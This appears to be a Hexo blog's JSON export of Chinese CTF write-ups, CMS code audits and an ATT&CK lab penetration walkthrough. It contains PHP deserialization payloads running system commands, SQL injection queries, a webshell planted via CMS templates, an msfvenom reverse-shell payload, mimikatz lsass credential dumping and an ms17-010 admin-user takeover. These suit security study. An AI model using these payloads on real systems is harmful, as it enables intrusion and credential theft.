{"meta":{"title":"Hexo","subtitle":null,"description":null,"author":"John Doe","url":"http://yoursite.com","root":"/"},"pages":[],"posts":[{"title":"php原生类操作文件","slug":"php原生类操作文件","date":"2021-04-07T02:31:49.000Z","updated":"2021-04-07T02:44:48.596Z","comments":true,"path":"2021/04/07/php原生类操作文件/","link":"","permalink":"http://yoursite.com/2021/04/07/php原生类操作文件/","excerpt":"标准库（spl）SPL就是Standard PHP Library的缩写。据手册显示，SPL是用于解决典型问题(standard problems)的一组接口与类的集合。里边有一些处理文件的类 类 DirectoryIterator 遍历目录 FilesystemIterator 遍历目录 GlobIterator 遍历目录，但是不同的点在于它可以通配例如/var/html/www/flag* SplFileObject 读取文件，按行读取，多行需要遍历 finfo/finfo_open() 需要两个参数","text":"标准库（spl）SPL就是Standard PHP Library的缩写。据手册显示，SPL是用于解决典型问题(standard problems)的一组接口与类的集合。里边有一些处理文件的类 类 DirectoryIterator 遍历目录 FilesystemIterator 遍历目录 GlobIterator 遍历目录，但是不同的点在于它可以通配例如/var/html/www/flag* SplFileObject 读取文件，按行读取，多行需要遍历 finfo/finfo_open() 需要两个参数 例题DASCTF 2021.3月 ez_serialize 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&lt;?phperror_reporting(0);highlight_file(__FILE__);class A&#123; public $class; public $para; public $check; public function __construct() &#123; $this-&gt;class = &quot;B&quot;; $this-&gt;para = &quot;ctfer&quot;; echo new $this-&gt;class ($this-&gt;para); &#125; public function __wakeup() &#123; $this-&gt;check = new C; if($this-&gt;check-&gt;vaild($this-&gt;para) &amp;&amp; $this-&gt;check-&gt;vaild($this-&gt;class)) &#123; echo new $this-&gt;class ($this-&gt;para); &#125; else die(&apos;bad hacker~&apos;); &#125;&#125;class B&#123; var $a; public function __construct($a) &#123; $this-&gt;a = $a; echo (&quot;hello &quot;.$this-&gt;a); &#125;&#125;class C&#123; function vaild($code)&#123; $pattern = &apos;/[!|@|#|$|%|^|&amp;|*|=|\\&apos;|&quot;|:|;|?]/i&apos;; if (preg_match($pattern, $code))&#123; return false; &#125; else return true; &#125;&#125;if(isset($_GET[&apos;pop&apos;]))&#123; unserialize($_GET[&apos;pop&apos;]);&#125;else&#123; $a=new A;&#125; 直接读取/var/www/html下文件有哪些,得到一个文件夹aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErE 12345678&lt;?phpclass A&#123; public $class=&apos;FilesystemIterator&apos;; public $para=&quot;/var/www/html&quot;; public $check; &#125;$o = new A();echo serialize($o); 然后遍历文件夹 12345678&lt;?phpclass A&#123; public $class=&apos;FilesystemIterator&apos;; public $para=&quot;/var/www/html/aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErE&quot;; public $check; &#125;$o = new A();echo serialize($o); 得到flag 123456789&lt;?phpclass A&#123; public $class=&apos;SplFileObject&apos;; public $para=&quot;/var/www/html/aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErE/flag.php&quot;; public $check; &#125;$o = new A();echo serialize($o); 参考：","categories":[],"tags":[]},{"title":"HGAME2021","slug":"HGAME2021","date":"2021-02-01T10:54:16.000Z","updated":"2021-02-01T11:17:22.275Z","comments":true,"path":"2021/02/01/HGAME2021/","link":"","permalink":"http://yoursite.com/2021/02/01/HGAME2021/","excerpt":"","text":"week1智商检测鸡打开题目，让做定积分的题，并且做够100道才给flag，很明显需要用脚本跑； 先分析过程： 打开f12,看网络 访问/static/js/fuckmath.js，注意到里边有几个功能函数，getstadus，getquestion，getflag，分析代码，当solving为100时，会调用getflag函数； 先计算出第一个定积分的答案，然后提交数据，抓包整理过程： 1index-&gt;vetify-&gt;getquestion-&gt;getstatus 本来以为主页面会有一个提交数据的地方给vetify，但是没有找到，只能构造请求头，伪造从index到vetify，直接请求vetify; 脚本： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788from sympy import *import requestsimport reurl = 'http://r4u.top:5000/api/getQuestion'response = requests.get(url=url)cookie_value = ''for key, value in response.cookies.items(): cookie_value += key + '=' + value + ';'print(cookie_value)j=-1while j &lt;100: if j!=-1: print(j) url1 = 'http://r4u.top:5000/api/verify' data = &#123; 'answer': float(res) &#125; response1 = requests.post(url=url1, headers=header, json=data) html1 = response1.text print(html1) cookie_value = '' for key, value in response1.cookies.items(): cookie_value += key + '=' + value + ';' ##print(cookie_value) header = &#123; 'Host': 'r4u.top:5000', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0', 'Accept': '*/*', 'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2', 'Accept-Encoding': 'gzip, deflate', 'Content-Type': 'application/json;charset=utf-8', 'Cache': 'no-cache', 'Content-Length': '12', 'Origin': 'http://r4u.top:5000', 'Connection': 'keep-alive', 'Referer': 'http://r4u.top:5000/', 'Cookie': cookie_value &#125; ##print(header) response = requests.get(url=url, headers=header) if j!=99: header = &#123; 'Host': 'r4u.top:5000', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0', 'Accept': '*/*', 'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2', 'Accept-Encoding': 'gzip, deflate', 'Content-Type': 'application/json;charset=utf-8', 'Cache': 'no-cache', 'Content-Length': '12', 'Origin': 'http://r4u.top:5000', 'Connection': 'keep-alive', 'Referer': 'http://r4u.top:5000/', 'Cookie': cookie_value &#125; response = requests.get(url=url, headers=header) html = response.text pattern1 = '&lt;mo&gt;.?&lt;/mo&gt;' pattern2 = '&lt;mn&gt;[0-9]+&lt;/mn&gt;' html = response.text fuhao = re.findall(pattern1, html)[0] fuhao = fuhao[4] print(fuhao, end=' ') shuju = re.findall(pattern2, html) i = 0 while i &lt; 4: shuju[i] = re.sub('&lt;mn&gt;|&lt;/mn&gt;', '', shuju[i]) print(shuju[i], end=' ') i = i + 1 a = int(shuju[0]) if fuhao == '-': a = -a b = int(shuju[1]) c = int(shuju[2]) d = int(shuju[3]) x = symbols('x') res = integrate(c * x + d, (x, a, b)) print(res) j = j + 1## 答对100道题后获取flagurl2='http://r4u.top:5000/api/getFlag'response2=requests.get(url=url2,headers=header)print(response2 .text)","categories":[],"tags":[]},{"title":"代码审计之yxcms1.4.6","slug":"代码审计之yxcms1-4-6","date":"2021-01-26T08:48:46.000Z","updated":"2021-01-26T10:55:35.828Z","comments":true,"path":"2021/01/26/代码审计之yxcms1-4-6/","link":"","permalink":"http://yoursite.com/2021/01/26/代码审计之yxcms1-4-6/","excerpt":"","text":"filesController.ph处任意文件删除文件：protected\\apps\\admin\\controller\\filesController.php在filesController.php文件的52-61行中，其中文件路径$dirs拼接了in($_GET[‘fname’]),然后在第57行-59行中对拼接后的路径进行判断，如果是文件目录便执行del_dir方法，如果是文件便执行unlink函数删除文件。先看下从get的fname到$dirs之间进行了什么过滤和处理；首先调用了in方法，在common.function.php的第8-23行，跟进in函数内；代码中对传入的数据进行htmlspecialchars和addslashes处理，但是并不会对../进行处理。然后出来，跟进del_dir方法，在common.function.php的第421-436行中，代码时先对目录中的文件进行删除，若目录中仍有目录，则递归执行del_dir方法，最后再删除文件目录；由于过滤不太严格，存在任意文件删除；例如： http://127.0.0.1/yxcms/index.php?r=admin/files/del&amp;fname=/../1.txt //可以删除和upload同目录下的1.txt文件linkController.php任意文件删除文件：\\protected\\apps\\admin\\controller\\linkController.php","categories":[],"tags":[]},{"title":"反序列化之pop链","slug":"反序列化之pop链","date":"2021-01-25T09:48:50.000Z","updated":"2021-02-02T06:01:05.906Z","comments":true,"path":"2021/01/25/反序列化之pop链/","link":"","permalink":"http://yoursite.com/2021/01/25/反序列化之pop链/","excerpt":"","text":"pop链简单的序列化攻击是因为对魔术方法的自动调用而触发漏洞，但如果关键代码不在魔术方法，而是在一个类的普通方法中，则需要观察联系类与函数之间的关系，将其与魔术方法的利用结合起来，这时候就可以利用pop链的构造与攻击。 [MRCTF2020]Ezpop题目源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354Welcome to index.php&lt;?php//flag is in flag.php//WTF IS THIS?//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95//And Crack It!class Modifier &#123; protected $var; public function append($value)&#123; include($value); &#125; public function __invoke()&#123; $this-&gt;append($this-&gt;var); &#125;&#125;class Show&#123; public $source; public $str; public function __construct($file='index.php')&#123; $this-&gt;source = $file; echo 'Welcome to '.$this-&gt;source.\"&lt;br&gt;\"; &#125; public function __toString()&#123; return $this-&gt;str-&gt;source; &#125; public function __wakeup()&#123; if(preg_match(\"/gopher|http|file|ftp|https|dict|\\.\\./i\", $this-&gt;source)) &#123; echo \"hacker\"; $this-&gt;source = \"index.php\"; &#125; &#125;&#125;class Test&#123; public $p; public function __construct()&#123; $this-&gt;p = array(); &#125; public function __get($key)&#123; $function = $this-&gt;p; return $function(); &#125;&#125;if(isset($_GET['pop']))&#123; @unserialize($_GET['pop']);&#125;else&#123; $a=new Show; highlight_file(__FILE__);&#125; 用到的魔术方法： 12345__construct 当一个对象创建时被调用，__toString 当一个对象被当作一个字符串被调用。__wakeup() 使用unserialize时触发__get() __get()方法将在访问不存在的成员变量时触发，如此处Test-&gt;var。__invoke() 对象本身是不能够当做函数去使用的，一旦被当做函数使用，就会回调执行__invoke()方法 题目给出了falg在哪，并且提示使用pop链。 首先寻找pop链的开端，在Modifier类中的append方法中发现include函数，先搞明白我最终要的结果是什么。要用到append这个方法，并且让$value等于flag.php。继续寻找，在__invoke中调用了append方法，并且$var为参数；然后考虑如何能触发__invoke这个魔术方法；在Test类的__get方法中，发现$function(); public function __get($key){ $function = $this-&gt;p; return $function(); }只要使$this-&gt;p赋值为Modifier类，那么相当于Modifier类被当作函数处理，所以会调用Modifier类中的__invoke()方法。然后寻找触发__get的地方；在Show类中，__wakeup()方法中，通过preg_match()将$this-&gt;source做字符串比较，如果$this-&gt;source是Show类，就调用了__toString()方法；tostring方法会返回$this-&gt;str-&gt;source，把赋值$this-&gt;str为一个Test类，test类中没有source参数，然后就会触发__get方法。 把逻辑梳理一下：实例化一个Show类，会调用__wakeup(),如果实例化的时候能传入一个show类，就能触发__tostring()方法，str实例化成一个没有source属性的类，进而触发__get(),让$p也实例化Modifier类，这样触发__get()之后，$function()就能到Modifier类，从而触发__invoke(). payload: 1234567891011121314151617181920212223242526&lt;?phpclass Modifier&#123; protected $var=&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;&#125;class Show&#123; public $source; public $str; public function __construct() &#123; $this-&gt;str=new Test(); &#125;&#125;class Test&#123; public $p; public function __get($key)&#123; $function = $this-&gt;p; return $function(); &#125;&#125;$hack=new Show();$hack-&gt;source=new Show(); ////因为我们要传入$file=一个类 这样$this-&gt;source=$file之后 在正则过滤时 就是一个类被当作字符串对待 触发__toString$hack-&gt;source-&gt;str-&gt;p=new Modifier();echo urlencode(serialize($hack));","categories":[],"tags":[]},{"title":"[GKCTF2020]cve版签到&&[网鼎杯 2020 朱雀组]phpweb","slug":"-GKCTF2020-cve版签到-网鼎杯-2020-朱雀组-phpweb","date":"2021-01-20T12:06:43.000Z","updated":"2021-01-20T12:30:03.132Z","comments":true,"path":"2021/01/20/-GKCTF2020-cve版签到-网鼎杯-2020-朱雀组-phpweb/","link":"","permalink":"http://yoursite.com/2021/01/20/-GKCTF2020-cve版签到-网鼎杯-2020-朱雀组-phpweb/","excerpt":"","text":"[GKCTF2020]cve版签到cve-2020-7066在低于7.2.29的PHP版本7.2.x，低于7.3.16的7.3.x和低于7.4.4的7.4.x中，将get_headers（）与用户提供的URL一起使用时，如果URL包含零（\\ 0）字符，则URL将被静默地截断。这可能会导致某些软件对get_headers（）的目标做出错误的假设，并可能将某些信息发送到错误的服务器。 题目用%00截断，先看下本地： ?url=http://127.0.0.1%00www.ctfhub.com发现提示： [4] =&gt; Tips: Host must be end with &apos;123&apos;于是访问： ?url=http://127.0.0.123%00www.ctfhub.com得到flag。 [网鼎杯 2020 朱雀组]phpweb打开题目，查看源码，发现用表单提交两个参数：func和p；题目过一会，就会刷新一次，并且会显示当前时间；抓包发现提交的数据为：func=date&amp;p=Y-m-d+h%3Ai%3As+a猜测可能用的是call_user_func(函数名，参数)函数 call_user_func — 把第一个参数作为回调函数调用 于是改包，查看下源码： func=file_get_contents&amp;p=index.php得到源码： 123456789101112131415161718192021222324252627282930&lt;?php $disable_fun = array(\"exec\",\"shell_exec\",\"system\",\"passthru\",\"proc_open\",\"show_source\",\"phpinfo\",\"popen\",\"dl\",\"eval\",\"proc_terminate\",\"touch\",\"escapeshellcmd\",\"escapeshellarg\",\"assert\",\"substr_replace\",\"call_user_func_array\",\"call_user_func\",\"array_filter\", \"array_walk\", \"array_map\",\"registregister_shutdown_function\",\"register_tick_function\",\"filter_var\", \"filter_var_array\", \"uasort\", \"uksort\", \"array_reduce\",\"array_walk\", \"array_walk_recursive\",\"pcntl_exec\",\"fopen\",\"fwrite\",\"file_put_contents\"); function gettime($func, $p) &#123; $result = call_user_func($func, $p); $a= gettype($result); if ($a == \"string\") &#123; return $result; &#125; else &#123;return \"\";&#125; &#125; class Test &#123; var $p = \"Y-m-d h:i:s a\"; var $func = \"date\"; function __destruct() &#123; if ($this-&gt;func != \"\") &#123; echo gettime($this-&gt;func, $this-&gt;p); &#125; &#125; &#125; $func = $_REQUEST[\"func\"]; $p = $_REQUEST[\"p\"]; if ($func != null) &#123; $func = strtolower($func); if (!in_array($func,$disable_fun)) &#123; echo gettime($func, $p); &#125;else &#123; die(\"Hacker...\"); &#125; &#125; ?&gt; 查看源码发现，基本上可以使用的危险函数都给过滤掉了；不过发现有一个很多余的地方，test类没有被用到。大概可以猜到用反序列化了。 用到的脚本： 12345678910111213141516171819202122&lt;?phpfunction gettime($func, $p) &#123; $result = call_user_func($func, $p); $a= gettype($result); if ($a == \"string\") &#123; return $result; &#125; else &#123;return \"\";&#125;&#125;class Test &#123; var $p = \"cat /tmp/flagoefiu4r93\"; var $func = \"system\"; function __destruct() &#123; if ($this-&gt;func != \"\") &#123; echo gettime($this-&gt;func, $this-&gt;p); &#125; &#125; &#125;$c = new Test();echo serialize($c);?&gt; payload： func=unserialize&amp;p=O:4:&quot;Test&quot;:2:{s:1:&quot;p&quot;;s:4:&quot;ls /&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;} //查看当前路径下文件 func=unserialize&amp;p=O:4:&quot;Test&quot;:2:{s:1:&quot;p&quot;;s:18:&quot;find / -name flag*&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;} //找flag在哪里 O:4:&quot;Test&quot;:2:{s:1:&quot;p&quot;;s:22:&quot;cat /tmp/flagoefiu4r93&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;} //获得flag","categories":[],"tags":[]},{"title":"反序列化字符逃逸","slug":"反序列化字符逃逸","date":"2021-01-20T10:19:55.000Z","updated":"2021-03-25T10:36:22.584Z","comments":true,"path":"2021/01/20/反序列化字符逃逸/","link":"","permalink":"http://yoursite.com/2021/01/20/反序列化字符逃逸/","excerpt":"","text":"例题unctf2020 easyunserialize题目： 123456789101112131415161718192021222324252627282930313233343536 &lt;?phperror_reporting(0);highlight_file(__FILE__);class a&#123; public $uname; public $password; public function __construct($uname,$password) &#123; $this-&gt;uname=$uname; $this-&gt;password=$password; &#125; public function __wakeup() &#123; if($this-&gt;password==='easy') &#123; include('flag.php'); echo $flag; &#125; else &#123; echo 'wrong password'; &#125; &#125; &#125;function filter($string)&#123; return str_replace('challenge','easychallenge',$string);&#125;$uname=$_GET[1];$password=1;$ser=filter(serialize(new a($uname,$password)));$test=unserialize($ser);?&gt; 传入一个名为1的参数，赋值给uname,对参数进行序列化处理，然后将序列化结果中的所有challenge替换为easychallenge，最后反序列化后password===easy就能拿到flag。 a:2:{i:0;s:8:”Hed9eh0g”;i:1;s:5:”aaaaa”;}abc对于这个字符串，进行反序列化时，，第一个右括号之后的字符都是作废的外的，说明反序列化的过程是有一定的识别范围的，根据这个特性，把部分需要的序列化过的字符串加入到原字符串中：此题中需要的字符串为： “;s:8:”password”;s:4:”easy”;}我们需要构造出类似这样的字符串：O:1:”a”:2:{s:5:”uname”;s:13:”easychallenge”;s:8:”password”;i:1;} filter这个函数，是做这个题的关键，每一个challenge字符的出现可以增加4个字符。 “;s:8:”password”;s:4:”easy”;}是29个字符 可以构造这样的算式：9x+29=13x，这样的x得出的不会是整数，必须得让需要的那部分是4的倍数，于是可以这样构造：“;s:8:”password”;s:4:”easy”;} 29 “;s:8:”password”;s:4:”easy”;s:2:”a”} 36 9x+36=13x 得x=9,于是可以需要9个challenge，可以构造： ?1=challengechallengechallengechallengechallengechallengechallengechallengechallenge&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;s:2:&quot;a&quot;}得到flag。 经过序列化后： O:1:&quot;a&quot;:2:{s:5:&quot;uname&quot;;s:117:&quot;challengechallengechallengechallengechallengechallengechallengechallengechallenge&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;s:2:&quot;a&quot;}&quot;;s:8:&quot;password&quot;;i:1;}再过滤： O:1:&quot;a&quot;:2:{s:5:&quot;uname&quot;;s:117:&quot;easychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallenge&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;s:2:&quot;a&quot;}&quot;;s:8:&quot;password&quot;;i:1;} [0CTF 2016]piapiapia源码泄露，www.zip获取源码，然后进行代码审计。先理清大致过程，注册–&gt;登陆–&gt;更新信息–&gt;显示信息 把所有源码大概看了一下，发现在update.php的第28行中进行了序列化处理。把传入的数据以数组的形式存储，然后对数组进行序列化； 继续跟进到user类的update_profile中，发现会对序列化的字符串进行过滤； 然后去查看这个filter， 123456789public function filter($string) &#123; $escape = array('\\'', '\\\\\\\\'); $escape = '/' . implode('|', $escape) . '/'; $string = preg_replace($escape, '_', $string); $safe = array('select', 'insert', 'update', 'delete', 'where'); $safe = '/' . implode('|', $safe) . '/i'; return preg_replace($safe, 'hacker', $string); &#125; 这就很明显了，非常符合字符串逃逸。 在更新信息的时候，我们可以对nickname进行修改，让他序列化后覆盖掉photo的值，令photo的值为config.php（因为我们在查看config.php时发现了flag变量），代码对nickname的长度进行了限定，可以用数组绕过； 然后开始构造nickname的值 常规思路我们需要的字符串是：”;s:5:”photo”;s:10:”config.php”;} 但是，这里由于nickname是数组，我们需要先对数组进行闭合，所以有：”;}s:5:”photo”;s:10:”config.php”;} 一共是34个字符，我们需要逃逸34个字符； 使用select、insert、update、delete的话，用hacker替换，都是6变6，所以选用where， 用一个where可以逃逸1个字符，所以需要34个where，于是payload为： 1wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125; 经过序列化以及过滤后为： 1a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;13339215489&quot;;s:5:&quot;email&quot;;s:16:&quot;123456789@qq.com&quot;;s:10:&quot;nickname[]&quot;;s:204:&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;&quot;;s:5:&quot;photo&quot;;s:39:&quot;upload/dd7ec931179c4dcb6a8ffb8b8786d20b&quot;;&#125; 更改数据时，抓包，修改nickname为数组nickname[],并且修改其值，然后去查看信息profile.php;查看页面源代码，会发现base64编码，解码得flag； [安洵杯 2019]easy_serialize_php源码： 12345678910111213141516171819202122232425262728293031323334353637383940 &lt;?php$function = @$_GET['f'];function filter($img)&#123; $filter_arr = array('php','flag','php5','php4','fl1g'); $filter = '/'.implode('|',$filter_arr).'/i'; return preg_replace($filter,'',$img);&#125;if($_SESSION)&#123; unset($_SESSION);&#125;$_SESSION[\"user\"] = 'guest';$_SESSION['function'] = $function;extract($_POST);if(!$function)&#123; echo '&lt;a href=\"index.php?f=highlight_file\"&gt;source_code&lt;/a&gt;';&#125;if(!$_GET['img_path'])&#123; $_SESSION['img'] = base64_encode('guest_img.png');&#125;else&#123; $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));&#125;$serialize_info = filter(serialize($_SESSION));if($function == 'highlight_file')&#123; highlight_file('index.php');&#125;else if($function == 'phpinfo')&#123; eval('phpinfo();'); //maybe you can find something in here!&#125;else if($function == 'show_image')&#123; $userinfo = unserialize($serialize_info); echo file_get_contents(base64_decode($userinfo['img']));&#125; 首先通读代码，在倒数第四行有提示，去phpinfo看看。 ​ 看到flag字样，可能是解题的关键，每一个php文件都包含这个文件；尝试访问，访问不到； 猜测flag可能在这个文件中，尝试读取这个文件 然后回到代码，在最后一行发现file_get_contents函数，可以读取文件，然后一直溯源他的变量； $userinfo[‘img’]–&gt;$serialize_info–&gt;$_SESSION 如果对$_SESSION这个变量进行控制，就可以读取想要的文件， 然后发现extract函数，extract($_POST);很明显，我们可以通过post$_Session变量，实现extract变量覆盖，进而控制相应的变量。 从$_SESSION到$userinfo[‘img’]变量赋值期间，进行了filter过滤以及序列化，反序列化,仔细观察，符合字符串逃逸的条件。 接着确认我们需要的东西，然后一步步的构造： $_SESSION[img]在extract函数之后赋值，无法覆盖，只能从$_SESSION[function]下手，把img序列化的值写到function里边； 需要的str：”;s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA==”;} 然后还需要字符串逃逸，通过过滤函数，把flag、php等关键字过滤，实现逃逸 需要的str：”;s:8:”function”;s:5:”hello”;s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA==”;} 进一步构造： 12$_SESSION[&apos;user&apos;]=&apos;flagflagflagflagflagflagphp&apos;;$_SESSION[&quot;function&quot;]=hi&quot;;s:8:&quot;function&quot;;s:5:&quot;hello&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125; 最终的payload： 12?f=show_imagepost:_SESSION[user]=flagflagflagflagflagflagphp&amp;_SESSION[function]=hihi&quot;;s:8:&quot;function&quot;;s:5:&quot;hello&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125; 这个payload被序列化后： 1a:3:&#123;s:4:&quot;user&quot;;s:27:&quot;flagflagflagflagflagflagphp&quot;;s:8:&quot;function&quot;;s:72:&quot;hihi&quot;;s:8:&quot;function&quot;;s:5:&quot;hello&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:3:&quot;img&quot;;&#125; 进行敏感字过滤后： 1a:3:&#123;s:4:&quot;user&quot;;s:27:&quot;&quot;;s:8:&quot;function&quot;;s:72:&quot;hihi&quot;;s:8:&quot;function&quot;;s:5:&quot;hello&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:3:&quot;img&quot;;&#125; 读取 d0g3_f1ag.php得到： flag in /d0g3_fllllllag 先对d0g3_fllllllagbase64加密后发现和d0g3_f1ag.php的长度一样，只需要把上一个加密后的改成这个文件名的base64密文得到flag","categories":[],"tags":[]},{"title":"代码审计之bluecms_v1.6","slug":"代码审计之bluecms-v1-6","date":"2021-01-15T09:15:03.000Z","updated":"2021-01-15T10:04:10.367Z","comments":true,"path":"2021/01/15/代码审计之bluecms-v1-6/","link":"","permalink":"http://yoursite.com/2021/01/15/代码审计之bluecms-v1-6/","excerpt":"","text":"环境搭建bluecms v1.6 sp1phpstudy php5.4.45+apache+mysqlwin7 64位专业版 漏洞发现ad_js.php SQL注入漏洞这里get传的参数ad_id只进行了简单的去空格操作，下面进行的select查询，只是简单的把这个变量加到了sql语句后边，没有进行任何过滤；下面是注入过程： ?ad_id=-1 union select 1,2,3,4,5,6,7 //发现回显位 ?ad_id=-1 union select 1,2,3,4,5,6,database() //当前数据库 ?ad_id=-1 union select 1,2,3,4,5,6,group_concat(table_name) from information_schema.tables where table_schema=database() //查表 ?ad_id=-1 union select 1,2,3,4,5,6,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x626c75655f75736572 //查列名，由于对&apos;进行了过滤，所以这里用十六进制绕过 ?ad_id=-1 union select 1,2,3,4,5,6,group_concat(concat_ws(0x7e,user_name,pwd)) from blue_user //查数据看代码的最后几行会发现，对引号，\\r,\\n,进行了过滤，在其前面加了转义字符,所以对单引号，对引号的数据进行十六进制编码，绕过；因为十六进制会被认为是字符串此外，回显的内容要在页面源代码里查看 ps：初学代码审计，这个漏洞是看别人的，我做了复现；因为是学习，不仅要知其然，还要知其所以然；开始思考，为什么会凭空多出一个这个ad_js.php？然后开始溯源，发现这个在/admin/ad.php中出现，对代码进行观察以及在浏览器查看相应的功能，发现这是用来获取广告的js的。 个人资料修改处xss存储型漏洞根据浏览器页面显示，找到user.php的my_info方法；个人信息都是post进来的，$birthday、$email、$msn、$qq、$mobile_phone、$office_phone、$home_phone都只是进行简单的去空格处理，$sex 获取变量的整数值,$address进行了实体化编码；邮件、地址、电话之类的都可以进行xss，可以直接写入；","categories":[],"tags":[]},{"title":"ATT CK(一)","slug":"ATT-CK-一","date":"2020-12-25T12:53:57.000Z","updated":"2020-12-27T16:35:16.637Z","comments":true,"path":"2020/12/25/ATT-CK-一/","link":"","permalink":"http://yoursite.com/2020/12/25/ATT-CK-一/","excerpt":"","text":"web网站访问在win7主机上开启phpstudy 信息收集1.在kali上使用nmap探测win7外网ip地址2.得知192.168.254.154主机开启了80、3306端口，即开启了web、mysql服务访问web服务 3.使用御剑进行目录扫描，得到phpmyadmin数据库登录界面，与beifen.rar,解压后猜测为yxcms网站管理系统的备份文件尝试访问 ![屏幕截图 2020-12-16 162052](C:\\Users\\lenovo\\Desktop\\att&amp;ck\\屏幕截图 2020-12-16 162052.jpg) 漏洞搜索与利用1.访问yxcms后，发现公告信息，有后台与默认密码 2.成功登入后台，在管理首页-&gt;前台模板 处，发现能够添加和修改一些php文件；找到index_index.php,猜测这个可能是作为首页模板作为引用，在文件最后加上php一句话木马然后用菜刀连接 也可以直接创建新的模板，写上一句话木马根据之前下载的备份文件内容，查出文件路径，进行菜刀连接 内网渗透1.msf反弹win7shell 使用msf生成shell.php,用蚁剑上传，执行，kail监听，成功反弹shell到msf上。 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.21.136 LPORT=4444 -f exe &gt; shell.exe 输入shell，查看系统信息；有乱码，看着很不舒服；使用 chcp 65001 这条语句即可解决msf拿到windows的shell显示乱码 2.hash密码抓取 这里是使用procdump配合mimikatz读明文密码上传procdump 上传mimikatz 使用procdump导出lsass.dmp procdump64.exe -accepteula -ma lsass.exe lsass.dmp然后使用mimikatz读取密码： mimikatz privilege::debug sekurlsa::minidump lsass.dmp sekurlsa::logonpasswords横向渗透由上面获取的系统信息，得知内网网段：192.168.52.0/24先添加一条路由进来 run autoroute 192.168.52.0/24 arp -a 查看内网存活主机 发现其他两台主机192.168.52.141、192.168.52.138 使用端口扫描扫描模块 auxiliary/scanner/portscan/tcp发现开启了445端口，所以利用auxiliary/scanner/smb/smb_version可以扫描系统版本，扫描结果是windows2003 百度搜索win2003漏洞，发现ms08-067 使用ms08-067打一下，发现打不了 开始尝试ms17-010，直接拿不到shell，发现可以使用auxiliary/admin/smb/ms17_010_command来执行一些命令且是系统权限，于是执行新建用户添加管理员，打开3389，然后通过proxychains远程桌面连接 use auxiliary/admin/smb/ms17_010_command show options set rhosts 192.168.52.141 set command net user test @!FuckSEC!@ /add #添加用户 run #成功执行 set command net localgroup administrators test /add #管理员权限 run #成功执行 set command &apos;REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f&apos; run #成功执行 成功拿下第二个主机 拿下域控定位到域控制器的ip为192.168.52.138先试试smb扫描系统版本能成功 win2008因为之前抓到了域管理的账号密码所以直接使用exploit/windows/smb/psexec模块拿下域控，且是管理员权限","categories":[],"tags":[]},{"title":"buuctf之1points","slug":"buuctf之1points","date":"2020-11-12T12:17:34.000Z","updated":"2021-02-04T09:01:21.625Z","comments":true,"path":"2020/11/12/buuctf之1points/","link":"","permalink":"http://yoursite.com/2020/11/12/buuctf之1points/","excerpt":"","text":"[HCTF 2018]WarmUp知识点mb_substr()函数返回字符串的一部分，shustr()函数只能用于英文字符，如果要分割的中文文字则需要用这个函数mb_strpos()查找字符串在另一个字符串中首次出现的位置 解题首先ctrl+u打开源码，发现提示，source.php,进入后，得到源代码： &lt;?php highlight_file(__FILE__); class emmm { public static function checkFile(&amp;$page) { $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;]; if (! isset($page) || !is_string($page)) { echo &quot;you can&apos;t see it&quot;; return false; } if (in_array($page, $whitelist)) { return true; } $_page = mb_substr( $page, 0, mb_strpos($page . &apos;?&apos;, &apos;?&apos;) ); if (in_array($_page, $whitelist)) { return true; } $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . &apos;?&apos;, &apos;?&apos;) ); if (in_array($_page, $whitelist)) { return true; } echo &quot;you can&apos;t see it&quot;; return false; } } if (! 